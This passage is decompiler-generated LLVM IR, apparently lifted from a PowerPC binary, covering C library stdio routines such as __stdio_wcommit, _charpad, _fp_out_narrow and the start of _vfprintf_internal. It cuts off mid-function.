  store i32 %storemerge1, i32* @r31, align 4
  %v3_100035e4 = icmp eq i32 %storemerge1, 0
  br i1 %v3_100035e4, label %dec_label_pc_100035ec, label %dec_label_pc_100035cc

dec_label_pc_100035ec:                            ; preds = %dec_label_pc_100035e0, %dec_label_pc_100035c0
  %v0_100035fc = phi i32 [ %v0_100035fc16, %dec_label_pc_100035c0 ], [ %v0_100035fc17, %dec_label_pc_100035e0 ]
  ret i32 %v0_100035fc

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_100035cc, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_100035e0, { 1, 0 }
  uselistorder label %dec_label_pc_100035cc, { 1, 0 }
  uselistorder label %dec_label_pc_100035a0, { 1, 0 }
  uselistorder label %dec_label_pc_10003574, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_10003608 = load i32, i32* @r31, align 4
  %v0_1000360c = load i32, i32* @r3, align 4
  %v1_10003614 = add i32 %v0_1000360c, 8
  %v2_10003614 = inttoptr i32 %v1_10003614 to i32*
  %v3_10003614 = load i32, i32* %v2_10003614, align 4
  %v1_10003618 = add i32 %v0_1000360c, 16
  %v2_10003618 = inttoptr i32 %v1_10003618 to i32*
  %v3_10003618 = load i32, i32* %v2_10003618, align 4
  %v2_10003620 = sub i32 %v3_10003618, %v3_10003614
  store i32 %v2_10003620, i32* @r5, align 4
  %v5_10003620 = icmp eq i32 %v2_10003620, 0
  br i1 %v5_10003620, label %dec_label_pc_10003630, label %dec_label_pc_10003628

dec_label_pc_10003628:                            ; preds = %entry
  store i32 %v3_10003614, i32* %v2_10003618, align 4
  store i32 268449328, i32* @lr, align 4
  %v2_1000362c = inttoptr i32 %v3_10003614 to i16*
  %v3_1000362c = call i32 @__stdio_WRITE(i16* %v2_1000362c, i32 %v2_10003620)
  %v0_10003630.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10003630

dec_label_pc_10003630:                            ; preds = %entry, %dec_label_pc_10003628
  %v0_10003630 = phi i32 [ %v0_1000360c, %entry ], [ %v0_10003630.pre, %dec_label_pc_10003628 ]
  %v1_10003630 = add i32 %v0_10003630, 8
  %v2_10003630 = inttoptr i32 %v1_10003630 to i32*
  %v3_10003630 = load i32, i32* %v2_10003630, align 4
  %v1_10003634 = add i32 %v0_10003630, 16
  %v2_10003634 = inttoptr i32 %v1_10003634 to i32*
  %v3_10003634 = load i32, i32* %v2_10003634, align 4
  store i32 %v0_10003608, i32* @r31, align 4
  %v2_1000363c = sub i32 %v3_10003634, %v3_10003630
  ret i32 %v2_1000363c

; uselistorder directives
  uselistorder i32 %v0_10003630, { 1, 0 }
  uselistorder i32 %v3_10003614, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10003630, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_100036784 = icmp eq i32 %arg3, 0
  %v2_1000367c = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_100036784, label %dec_label_pc_10003698, label %dec_label_pc_1000368c

dec_label_pc_10003674:                            ; preds = %dec_label_pc_1000368c
  %v1_10003674 = add i32 %v0_10003674, -1
  store i32 %v1_10003674, i32* @r31, align 4
  %v3_10003678 = icmp eq i32 %v1_10003674, 0
  %v0_10003684 = load i32, i32* @r29, align 4
  br i1 %v3_10003678, label %dec_label_pc_10003698.loopexit, label %dec_label_pc_1000368c

dec_label_pc_1000368c:                            ; preds = %entry, %dec_label_pc_10003674
  %v0_100036846 = phi i32 [ %v0_10003684, %dec_label_pc_10003674 ], [ %arg1, %entry ]
  store i32 268449424, i32* @lr, align 4
  %v3_1000368c = inttoptr i32 %v0_100036846 to i16*
  %v4_1000368c = call i32 @__stdio_fwrite(i32 %v2_1000367c, i32 1, i16* %v3_1000368c)
  %v3_10003690 = icmp eq i32 %v4_1000368c, 1
  %v0_10003674 = load i32, i32* @r31, align 4
  br i1 %v3_10003690, label %dec_label_pc_10003674, label %dec_label_pc_10003698.loopexit

dec_label_pc_10003698.loopexit:                   ; preds = %dec_label_pc_10003674, %dec_label_pc_1000368c
  %v0_1000369c.ph = phi i32 [ %v0_10003674, %dec_label_pc_1000368c ], [ 0, %dec_label_pc_10003674 ]
  %v1_1000369c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10003698

dec_label_pc_10003698:                            ; preds = %dec_label_pc_10003698.loopexit, %entry
  %v1_1000369c = phi i32 [ 0, %entry ], [ %v1_1000369c.pre, %dec_label_pc_10003698.loopexit ]
  %v0_1000369c = phi i32 [ 0, %entry ], [ %v0_1000369c.ph, %dec_label_pc_10003698.loopexit ]
  %v2_1000369c = sub i32 %v1_1000369c, %v0_1000369c
  ret i32 %v2_1000369c

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10003698.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000368c, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v1_100036bc = and i32 %arg2, 128
  %v3_100036bc = icmp eq i32 %v1_100036bc, 0
  store i32 %arg1, i32* %r26.global-to-local, align 4
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_100036bc, label %dec_label_pc_10003714, label %dec_label_pc_100036e0

dec_label_pc_100036e0:                            ; preds = %entry
  %v0_100036e0 = call i32 @__GI_strlen()
  %v0_100036e4 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100036e0, i32* @r31, align 4
  %v0_100036ec = load i32, i32* %r26.global-to-local, align 4
  %v1_100036f0 = load i32, i32* %r30.global-to-local, align 4
  %v2_100036f0 = sub i32 %v1_100036f0, %v0_100036e0
  store i32 %v2_100036f0, i32* %r29.global-to-local, align 4
  store i32 %v0_100036e0, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_100036f0, 1
  br i1 %tmp7, label %dec_label_pc_10003714, label %dec_label_pc_10003700

dec_label_pc_10003700:                            ; preds = %dec_label_pc_100036e0
  %v1_100036e4 = urem i32 %v0_100036e4, 128
  store i32 268449540, i32* @lr, align 4
  %v3_10003700 = trunc i32 %v1_100036e4 to i8
  %v4_10003700 = call i32 @_charpad(i32 %v0_100036ec, i8 %v3_10003700, i32 %v2_100036f0)
  %v0_10003704 = load i32, i32* @r31, align 4
  store i32 %v0_10003704, i32* %r30.global-to-local, align 4
  %v1_10003708 = load i32, i32* @r29, align 4
  %v4_10003708 = icmp eq i32 %v4_10003700, %v1_10003708
  store i32 %v4_10003700, i32* @r28, align 4
  br i1 %v4_10003708, label %dec_label_pc_10003700.dec_label_pc_10003714_crit_edge, label %dec_label_pc_10003738

dec_label_pc_10003700.dec_label_pc_10003714_crit_edge: ; preds = %dec_label_pc_10003700
  %v0_10003720.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10003714

dec_label_pc_10003714:                            ; preds = %dec_label_pc_10003700.dec_label_pc_10003714_crit_edge, %dec_label_pc_100036e0, %entry
  %v0_10003720 = phi i32 [ %v0_10003720.pre, %dec_label_pc_10003700.dec_label_pc_10003714_crit_edge ], [ %v0_100036ec, %dec_label_pc_100036e0 ], [ %arg1, %entry ]
  %v0_1000371c = phi i32 [ %v0_10003704, %dec_label_pc_10003700.dec_label_pc_10003714_crit_edge ], [ %v0_100036e0, %dec_label_pc_100036e0 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_1000371c, 1
  br i1 %tmp8, label %dec_label_pc_10003734, label %dec_label_pc_1000372c

dec_label_pc_1000372c:                            ; preds = %dec_label_pc_10003714
  %v0_10003718 = load i32, i32* @r27, align 4
  store i32 268449584, i32* @lr, align 4
  %v3_1000372c = inttoptr i32 %v0_10003720 to i16*
  %v4_1000372c = call i32 @__stdio_fwrite(i32 %v0_10003718, i32 %v0_1000371c, i16* %v3_1000372c)
  br label %dec_label_pc_10003734

dec_label_pc_10003734:                            ; preds = %dec_label_pc_10003714, %dec_label_pc_1000372c
  %v1_10003734 = phi i32 [ 0, %dec_label_pc_10003714 ], [ %v4_1000372c, %dec_label_pc_1000372c ]
  %v0_10003734 = load i32, i32* @r28, align 4
  %v2_10003734 = add i32 %v0_10003734, %v1_10003734
  br label %dec_label_pc_10003738

dec_label_pc_10003738:                            ; preds = %dec_label_pc_10003700, %dec_label_pc_10003734
  %v0_1000373c = phi i32 [ %v4_10003700, %dec_label_pc_10003700 ], [ %v2_10003734, %dec_label_pc_10003734 ]
  ret i32 %v0_1000373c

; uselistorder directives
  uselistorder i32 %v0_1000371c, { 1, 0 }
  uselistorder i32 %v2_100036f0, { 1, 0, 2 }
  uselistorder i32* %r26.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10003738, { 1, 0 }
  uselistorder label %dec_label_pc_10003734, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_3()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_3()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_10003754 = load i32, i32* @lr, align 4
  store i32 %v0_10003754, i32* %r0.global-to-local, align 4
  %v2_1000375c = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_1000375c, i32* %r30.global-to-local, align 4
  %v0_10003760 = load i32, i32* @r3, align 4
  store i32 %v0_10003760, i32* %r24.global-to-local, align 4
  %v0_1000376c = load i32, i32* @r5, align 4
  store i32 %v0_1000376c, i32* %r31.global-to-local, align 4
  %v0_10003770 = load i32, i32* @r4, align 4
  store i32 %v0_10003770, i32* @r29, align 4
  store i32 268449656, i32* @lr, align 4
  %v1_10003774 = bitcast i8** %stack_var_-200 to i32*
  %v2_10003774 = call i32 @_ppfs_init(i32* %v1_10003774)
  %tmp72 = icmp sgt i32 %v2_10003774, -1
  br i1 %tmp72, label %dec_label_pc_100037a8, label %dec_label_pc_10003780

dec_label_pc_10003780:                            ; preds = %entry
  %v3_10003780 = load i8*, i8** %stack_var_-200, align 4
  %v4_10003780 = ptrtoint i8* %v3_10003780 to i32
  store i32 %v4_10003780, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_10003780, i32* @r3, align 4
  %v0_1000378c = call i32 @__GI_strlen()
  %v3_10003790 = icmp eq i32 %v0_1000378c, 0
  br i1 %v3_10003790, label %dec_label_pc_10003da0, label %dec_label_pc_10003798

dec_label_pc_10003798:                            ; preds = %dec_label_pc_10003780
  %v0_10003798 = load i32, i32* @r31, align 4
  %v0_1000379c = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100037a4.356 to i32), i32* @lr, align 4
  %v3_100037a0 = inttoptr i32 %v0_1000379c to i16*
  %v4_100037a0 = call i32 @__stdio_fwrite(i32 %v0_10003798, i32 %v0_1000378c, i16* %v3_100037a0)
  br label %dec_label_pc_10003da0

dec_label_pc_100037a8:                            ; preds = %entry
  %v0_100037ac = load i32, i32* @r31, align 4
  store i32 268449716, i32* @lr, align 4
  %v2_100037b0 = call i32 @_ppfs_prepargs(i32 %v2_1000375c, i32 %v0_100037ac)
  store i32 0, i32* %r23.global-to-local, align 4
  %v2_10003848 = ptrtoint i32* %stack_var_-112 to i32
  %v4_1000384c = zext i8 %tmp59 to i32
  %tmp73 = icmp slt i32 %tmp60, 1
  %v2_10003870 = ptrtoint i32* %stack_var_-344 to i32
  %v3_10003874 = icmp eq i32 %tmp58, 0
  %tmp74 = icmp sgt i32 %tmp58, -1
  %v3_100038a8 = icmp eq i32 %tmp57, 0
  %v2_10003c00 = ptrtoint i32* %stack_var_-328 to i32
  %v2_10003b20 = ptrtoint i32* %stack_var_-340 to i32
  %v2_10003b24 = ptrtoint i32* %stack_var_-336 to i32
  %v5_10003998 = bitcast i32* %stack_var_-201 to i8*
  %tmp75 = icmp ult i32 %tmp57, 6
  %v3_10003a74 = icmp eq i32 %tmp57, 1
  %v2_10003a18 = icmp ugt i32 %tmp57, 2
  %v4_10003958 = zext i8 %tmp55 to i32
  %v0_10003d8c.pre = load i32, i32* @r29, align 4
  %v1_10003878 = add i32 %tmp58, 1
  %v2_100038d0 = icmp ugt i32 %tmp57, 7
  %v2_10003aac = icmp ugt i32 %tmp57, 15
  %v2_10003ae0 = icmp ugt i32 %tmp57, 17
  %v3_10003ae0 = icmp eq i32 %tmp57, 17
  %v2_10003b88 = icmp ugt i32 %tmp57, 19
  %v3_10003b88 = icmp eq i32 %tmp57, 19
  %v3_10003bf4 = icmp eq i32 %tmp57, 20
  %v1_100038e8 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1000bce8.358 to i32), i32 -1)
  %v2_100038e8 = inttoptr i32 %v1_100038e8 to i8*
  %v3_10003a24 = icmp eq i32 %tmp57, 3
  %v3_10003a34 = icmp eq i32 %tmp57, 4
  %v1_1000385c = mul nuw nsw i32 %v4_1000384c, 8
  %v2_10003860 = add i32 %v2_10003848, %v1_1000385c
  %v1_10003864 = add i32 %v2_10003860, -8
  br label %dec_label_pc_10003d8c

dec_label_pc_100037c0.backedge:                   ; preds = %dec_label_pc_10003814, %dec_label_pc_100037cc
  %storemerge12.in = phi i32 [ %v1_100037dc, %dec_label_pc_100037cc ], [ %v1_10003814, %dec_label_pc_10003814 ]
  %v1_100037d415 = phi i32 [ %v0_100037ec, %dec_label_pc_100037cc ], [ %v1_10003814, %dec_label_pc_10003814 ]
  %storemerge12 = add i32 %storemerge12.in, 1
  store i32 %storemerge12, i32* @r29, align 4
  br label %dec_label_pc_100037c0

dec_label_pc_100037c0:                            ; preds = %dec_label_pc_100037c0.backedge, %dec_label_pc_10003d8c
  %v0_100037ec = phi i32 [ %v1_100037d415, %dec_label_pc_100037c0.backedge ], [ %v0_10003d8c, %dec_label_pc_10003d8c ]
  %v1_100037dc = phi i32 [ %storemerge12, %dec_label_pc_100037c0.backedge ], [ %v0_10003d8c, %dec_label_pc_10003d8c ]
  %v1_100037c0 = inttoptr i32 %v1_100037dc to i8*
  %v2_100037c0 = load i8, i8* %v1_100037c0, align 1
  %v3_100037c0 = zext i8 %v2_100037c0 to i32
  store i32 %v3_100037c0, i32* %r0.global-to-local, align 4
  %v3_100037c4 = icmp eq i8 %v2_100037c0, 0
  br i1 %v3_100037c4, label %dec_label_pc_100037d4, label %dec_label_pc_100037cc

dec_label_pc_100037cc:                            ; preds = %dec_label_pc_100037c0
  %v3_100037cc = icmp eq i8 %v2_100037c0, 37
  br i1 %v3_100037cc, label %dec_label_pc_100037d4, label %dec_label_pc_100037c0.backedge

dec_label_pc_100037d4:                            ; preds = %dec_label_pc_100037cc, %dec_label_pc_100037c0
  %v4_100037d4 = icmp eq i32 %v1_100037dc, %v0_100037ec
  br i1 %v4_100037d4, label %dec_label_pc_10003808, label %dec_label_pc_100037dc

dec_label_pc_100037dc:                            ; preds = %dec_label_pc_100037d4
  %v2_100037dc = sub i32 %v1_100037dc, %v0_100037ec
  store i32 %v2_100037dc, i32* @r31, align 4
  %v4_100037dc = icmp sgt i32 %v2_100037dc, 0
  br i1 %v4_100037dc, label %dec_label_pc_100037ec, label %dec_label_pc_100037fc

dec_label_pc_100037ec:                            ; preds = %dec_label_pc_100037dc
  %v0_100037f4 = load i32, i32* %r24.global-to-local, align 4
  store i32 268449788, i32* @lr, align 4
  %v3_100037f8 = inttoptr i32 %v0_100037f4 to i16*
  %v4_100037f8 = call i32 @__stdio_fwrite(i32 %v0_100037ec, i32 %v2_100037dc, i16* %v3_100037f8)
  %v1_100037fc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100037fc

dec_label_pc_100037fc:                            ; preds = %dec_label_pc_100037dc, %dec_label_pc_100037ec
  %v1_10003804 = phi i32 [ %v1_100037fc.pre, %dec_label_pc_100037ec ], [ %v2_100037dc, %dec_label_pc_100037dc ]
  %storemerge = phi i32 [ %v4_100037f8, %dec_label_pc_100037ec ], [ 0, %dec_label_pc_100037dc ]
  %v4_100037fc = icmp eq i32 %storemerge, %v1_10003804
  br i1 %v4_100037fc, label %dec_label_pc_10003804, label %dec_label_pc_10003d9c

dec_label_pc_10003804:                            ; preds = %dec_label_pc_100037fc
  %v0_10003804 = load i32, i32* %r23.global-to-local, align 4
  %v2_10003804 = add i32 %v0_10003804, %v1_10003804
  store i32 %v2_10003804, i32* %r23.global-to-local, align 4
  %v0_10003808.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10003808

dec_label_pc_10003808:                            ; preds = %dec_label_pc_100037d4, %dec_label_pc_10003804
  %v0_10003814 = phi i32 [ %v0_100037ec, %dec_label_pc_100037d4 ], [ %v0_10003808.pre, %dec_label_pc_10003804 ]
  %v1_10003808 = inttoptr i32 %v0_10003814 to i8*
  %v2_10003808 = load i8, i8* %v1_10003808, align 1
  %v3_10003808 = zext i8 %v2_10003808 to i32
  store i32 %v3_10003808, i32* %r0.global-to-local, align 4
  %v3_1000380c = icmp eq i8 %v2_10003808, 0
  br i1 %v3_1000380c, label %dec_label_pc_10003da0, label %dec_label_pc_10003814

dec_label_pc_10003814:                            ; preds = %dec_label_pc_10003808
  %v1_10003814 = add i32 %v0_10003814, 1
  %v2_10003814 = inttoptr i32 %v1_10003814 to i8*
  %v3_10003814 = load i8, i8* %v2_10003814, align 1
  %v4_10003814 = zext i8 %v3_10003814 to i32
  store i32 %v4_10003814, i32* %r0.global-to-local, align 4
  %v3_1000381c = icmp eq i8 %v3_10003814, 37
  br i1 %v3_1000381c, label %dec_label_pc_100037c0.backedge, label %dec_label_pc_10003824

dec_label_pc_10003824:                            ; preds = %dec_label_pc_10003814
  store i32 %v2_1000375c, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_10003814, i8** %stack_var_-200, align 4
  store i32 268449852, i32* @lr, align 4
  %v3_10003838 = call i32 @_ppfs_parsespec(i32* %v1_10003774, i32 %v1_10003814)
  store i32 %v2_1000375c, i32* @r3, align 4
  store i32 268449860, i32* @lr, align 4
  %v0_10003840 = call i32 @_ppfs_setargs()
  store i32 %tmp60, i32* %r0.global-to-local, align 4
  store i32 %v2_10003848, i32* %r11.global-to-local, align 4
  store i32 %v4_1000384c, i32* @r7, align 4
  br i1 %tmp73, label %dec_label_pc_10003868, label %dec_label_pc_1000385c

dec_label_pc_1000385c:                            ; preds = %dec_label_pc_10003824
  br label %dec_label_pc_10003868

dec_label_pc_10003868:                            ; preds = %dec_label_pc_10003824, %dec_label_pc_1000385c
  %storemerge94 = phi i32 [ %v1_10003864, %dec_label_pc_1000385c ], [ %v2_10003848, %dec_label_pc_10003824 ]
  %v0_1000389483 = phi i32 [ %v1_10003864, %dec_label_pc_1000385c ], [ %v2_10003848, %dec_label_pc_10003824 ]
  store i32 %storemerge94, i32* %r10.global-to-local, align 4
  store i32 %v2_10003870, i32* %r8.global-to-local, align 4
  store i32 %v1_10003878, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_10003898.preheader, label %dec_label_pc_10003898.preheader.thread

dec_label_pc_10003898.preheader.thread:           ; preds = %dec_label_pc_10003868
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100038a4

dec_label_pc_10003898.preheader:                  ; preds = %dec_label_pc_10003868
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_10003874, label %dec_label_pc_100038a4, label %dec_label_pc_10003890.preheader

dec_label_pc_10003890.preheader:                  ; preds = %dec_label_pc_10003898.preheader
  store i32 %v0_1000389483, i32* %stack_var_-344, align 4
  %v1_1000389484 = add i32 %v0_1000389483, 8
  store i32 %v1_1000389484, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_100038a089 = add i32 %tmp58, -1
  store i32 %v1_100038a089, i32* %ctr.global-to-local, align 4
  %v2_100038a090 = icmp eq i32 %v1_100038a089, 0
  br i1 %v2_100038a090, label %dec_label_pc_100038a4, label %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge

dec_label_pc_10003890.dec_label_pc_10003890_crit_edge: ; preds = %dec_label_pc_10003890.preheader, %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge.dec_label_pc_10003890.dec_label_pc_10003890_crit_edge_crit_edge
  %v1_10003890.pre = phi i32 [ %v1_10003890.pre.pre, %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge.dec_label_pc_10003890.dec_label_pc_10003890_crit_edge_crit_edge ], [ %v2_10003870, %dec_label_pc_10003890.preheader ]
  %v1_1000389892 = phi i32 [ %v1_10003898, %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge.dec_label_pc_10003890.dec_label_pc_10003890_crit_edge_crit_edge ], [ 4, %dec_label_pc_10003890.preheader ]
  %v1_1000389491 = phi i32 [ %v1_10003894, %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge.dec_label_pc_10003890.dec_label_pc_10003890_crit_edge_crit_edge ], [ %v1_1000389484, %dec_label_pc_10003890.preheader ]
  %v3_10003890 = add i32 %v1_10003890.pre, %v1_1000389892
  %v4_10003890 = inttoptr i32 %v3_10003890 to i32*
  store i32 %v1_1000389491, i32* %v4_10003890, align 4
  %v0_10003894 = load i32, i32* %r10.global-to-local, align 4
  %v1_10003894 = add i32 %v0_10003894, 8
  store i32 %v1_10003894, i32* %r10.global-to-local, align 4
  %v0_10003898 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003898 = mul i32 %v0_10003898, 4
  store i32 %v1_10003898, i32* %r0.global-to-local, align 4
  %v1_1000389c = add i32 %v0_10003898, 1
  store i32 %v1_1000389c, i32* %r11.global-to-local, align 4
  %v0_100038a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100038a0 = add i32 %v0_100038a0, -1
  store i32 %v1_100038a0, i32* %ctr.global-to-local, align 4
  %v2_100038a0 = icmp eq i32 %v1_100038a0, 0
  br i1 %v2_100038a0, label %dec_label_pc_100038a4, label %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge.dec_label_pc_10003890.dec_label_pc_10003890_crit_edge_crit_edge

dec_label_pc_10003890.dec_label_pc_10003890_crit_edge.dec_label_pc_10003890.dec_label_pc_10003890_crit_edge_crit_edge: ; preds = %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge
  %v1_10003890.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge

dec_label_pc_100038a4:                            ; preds = %dec_label_pc_10003890.preheader, %dec_label_pc_10003890.dec_label_pc_10003890_crit_edge, %dec_label_pc_10003898.preheader.thread, %dec_label_pc_10003898.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_100038a8, label %dec_label_pc_100038b0, label %dec_label_pc_100038d0

dec_label_pc_100038b0:                            ; preds = %dec_label_pc_100038a4
  %v0_100038b4 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_100038b4, i32* @r6, align 4
  %tmp99 = icmp slt i32 %v0_100038b4, 0
  %v1_100038bc = zext i1 %tmp99 to i32
  %v2_100038bc = ashr i32 %v0_100038b4, 31
  %v3_100038bc = and i32 %v2_100038bc, -2
  %v4_100038bc = or i32 %v3_100038bc, %v1_100038bc
  store i32 %v4_100038bc, i32* @r5, align 4
  %v1_100038c4 = call i32 @__asm_rlwinm(i32 %v0_100039e0, i32 0, i32 20, i32 23)
  store i32 %v1_100038c4, i32* @r4, align 4
  %v1_100038c8 = inttoptr i32 %v1_100038c4 to i16*
  %v2_100038c8 = call i32 @_store_inttype(i16* %v1_100038c8)
  br label %dec_label_pc_10003d88

dec_label_pc_100038d0:                            ; preds = %dec_label_pc_100038a4
  br i1 %v2_100038d0, label %dec_label_pc_10003aac, label %dec_label_pc_100038d8

dec_label_pc_100038d8:                            ; preds = %dec_label_pc_100038d0
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_100038e8 = load i8, i8* %v2_100038e8, align 1
  %v4_100038e8 = zext i8 %v3_100038e8 to i32
  store i32 %v4_100038e8, i32* %r30.global-to-local, align 4
  %v3_100038ec = icmp eq i8 %v3_100038e8, 10
  br i1 %v3_100038ec, label %dec_label_pc_100038f4, label %dec_label_pc_10003918

dec_label_pc_100038f4:                            ; preds = %dec_label_pc_100038d8
  store i32 %v0_100039e0, i32* %r0.global-to-local, align 4
  %v1_100038f8 = call i32 @__asm_rlwinm(i32 %v0_100039e0, i32 27, i32 31, i32 31)
  %v2_100038fc = icmp ne i32 %v1_100038f8, 0
  %v1_10003908 = and i32 %v0_100039e0, 64
  %v3_10003908 = icmp eq i32 %v1_10003908, 0
  %v1_1000390c = select i1 %v2_100038fc, i32 44, i32 87
  store i32 %v1_1000390c, i32* %r31.global-to-local, align 4
  br i1 %v3_10003908, label %dec_label_pc_10003918, label %dec_label_pc_10003914

dec_label_pc_10003914:                            ; preds = %dec_label_pc_100038f4
  %v1_10003914 = or i32 %v1_1000390c, 128
  store i32 %v1_10003914, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10003918

dec_label_pc_10003918:                            ; preds = %dec_label_pc_100038d8, %dec_label_pc_100038f4, %dec_label_pc_10003914
  %v0_10003918 = load i32, i32* %r11.global-to-local, align 4
  %v2_10003918 = icmp ugt i32 %v0_10003918, 5
  br i1 %v2_10003918, label %dec_label_pc_10003940, label %dec_label_pc_10003920

dec_label_pc_10003920:                            ; preds = %dec_label_pc_10003918
  %v3_10003920 = icmp eq i32 %v0_10003918, 3
  br i1 %v3_10003920, label %dec_label_pc_10003928, label %dec_label_pc_10003930

dec_label_pc_10003928:                            ; preds = %dec_label_pc_10003920
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10003944

dec_label_pc_10003930:                            ; preds = %dec_label_pc_10003920
  %v3_10003930 = icmp eq i32 %v0_10003918, 1
  br i1 %v3_10003930, label %dec_label_pc_10003948, label %dec_label_pc_10003944

dec_label_pc_10003940:                            ; preds = %dec_label_pc_10003918
  %v0_10003940 = load i32, i32* %r30.global-to-local, align 4
  %v1_10003940 = sub i32 0, %v0_10003940
  store i32 %v1_10003940, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10003944

dec_label_pc_10003944:                            ; preds = %dec_label_pc_10003930, %dec_label_pc_10003928, %dec_label_pc_10003940
  br label %dec_label_pc_10003948

dec_label_pc_10003948:                            ; preds = %dec_label_pc_10003930, %dec_label_pc_10003944
  %storemerge2 = phi i32 [ 11, %dec_label_pc_10003944 ], [ 6, %dec_label_pc_10003930 ]
  store i32 %storemerge2, i32* @r27, align 4
  %v3_10003948 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10003948, i32* %r0.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_10003948, -1
  br i1 %tmp76, label %dec_label_pc_1000395c, label %dec_label_pc_10003958

dec_label_pc_10003958:                            ; preds = %dec_label_pc_10003948
  br label %dec_label_pc_1000395c

dec_label_pc_1000395c:                            ; preds = %dec_label_pc_10003948, %dec_label_pc_10003958
  %storemerge95 = phi i32 [ %v4_10003958, %dec_label_pc_10003958 ], [ 32, %dec_label_pc_10003948 ]
  store i32 %storemerge95, i32* @r26, align 4
  %v3_1000395c = icmp eq i32 %v0_10003918, 1
  br i1 %v3_1000395c, label %dec_label_pc_10003978, label %dec_label_pc_10003968

dec_label_pc_10003968:                            ; preds = %dec_label_pc_1000395c
  %v0_10003968 = load i32, i32* @r7, align 4
  %v1_10003968 = mul i32 %v0_10003968, 4
  store i32 %v1_10003968, i32* %r0.global-to-local, align 4
  %v0_1000396c = load i32, i32* @r1, align 4
  %v2_1000396c = add i32 %v0_1000396c, %v1_10003968
  %v1_10003970 = add i32 %v2_1000396c, 188
